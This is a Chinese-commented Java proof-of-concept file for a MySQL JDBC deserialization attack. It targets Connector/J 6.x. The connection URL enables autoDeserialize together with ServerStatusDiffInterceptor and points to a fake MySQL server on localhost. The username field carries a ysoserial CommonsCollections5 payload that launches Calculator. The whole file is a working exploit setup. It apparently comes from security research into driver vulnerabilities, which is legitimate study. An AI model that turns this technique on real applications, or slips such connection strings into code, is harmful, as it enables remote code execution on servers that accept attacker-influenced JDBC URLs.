package org.su18.jdbc.attack.mysql.serverstatus;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

/**
 * 使用 https://github.com/fnmsd/MySQL_Fake_Server 进行测试
 * 依赖版本 6.0.2
 * 驱动名称 com.mysql.jdbc.Driver
 * 属性名 statementInterceptors
 * 连接参数 autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
 * 从此版本包名多了 cj
 *
 * @author su18
 */
public class Attack6x {

	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://localhost:13308/whatever?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

		ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "yso_CommonsCollections5_open -a Calculator.app", "");
	}

}
